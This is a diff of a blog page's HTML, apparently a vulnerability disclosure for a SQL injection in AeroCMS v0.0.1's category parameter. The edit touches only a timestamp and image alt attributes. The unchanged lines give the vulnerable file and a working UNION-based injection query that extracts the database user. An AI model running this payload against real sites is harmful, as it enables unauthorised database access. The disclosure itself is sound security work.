@@ -26,7 +26,7 @@
 <meta property="og:image" content="http://rdyx0.github.io/2018/09/02/AeroCMS-v0.0.1-SQLi%20category_sql_injectin/image-20221113163557144.png">
 <meta property="og:image" content="http://rdyx0.github.io/2018/09/02/AeroCMS-v0.0.1-SQLi%20category_sql_injectin/image-20221113164028718.png">
 <meta property="article:published_time" content="2018-09-02T13:36:15.000Z">
-<meta property="article:modified_time" content="2022-11-13T09:13:26.441Z">
+<meta property="article:modified_time" content="2022-11-13T09:20:08.856Z">
 <meta property="article:author" content="儒道易行">
 <meta property="article:tag" content="AeroCMS">
 <meta property="article:tag" content="SQLi">
@@ -294,11 +294,11 @@
 <li>The <code>category</code> parameter from the AeroCMS-v0.0.1 CMS system appears to be vulnerable to SQL injection attacks. The malicious user can dump-steal the database, from this CMS system and he can use it for very malicious purposes.</li>
 </ul>
 <h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>Query out the current user</p>
-<p><img src="/2018/09/02/AeroCMS-v0.0.1-SQLi%20category_sql_injectin/image-20221113163557144.png" srcset="/img/loading.gif" lazyload alt="image-20221113163557144"></p>
+<p><img src="/2018/09/02/AeroCMS-v0.0.1-SQLi%20category_sql_injectin/image-20221113163557144.png" srcset="/img/loading.gif" lazyload></p>
 <h3 id="Vulnerable-Code"><a href="#Vulnerable-Code" class="headerlink" title="Vulnerable Code"></a>Vulnerable Code</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">AeroCMS</span>-<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>\category.php<br></code></pre></td></tr></table></figure>
 
 <p>The category parameter is passed in the GET mode and brought into the mysql_query() function without filtering</p>
-<p><img src="/2018/09/02/AeroCMS-v0.0.1-SQLi%20category_sql_injectin/image-20221113164028718.png" srcset="/img/loading.gif" lazyload alt="image-20221113164028718"></p>
+<p><img src="/2018/09/02/AeroCMS-v0.0.1-SQLi%20category_sql_injectin/image-20221113164028718.png" srcset="/img/loading.gif" lazyload></p>
 <p><strong>SQL query statements</strong></p>
 <figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> posts <span class="hljs-keyword">WHERE</span> post_category_id = <span class="hljs-number">2</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">ALL</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-keyword">user</span>(),<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>-- - <span class="hljs-keyword">AND</span> post_status = <span class="hljs-string">&#x27;published&#x27;</span><br></code></pre></td></tr></table></figure>
 
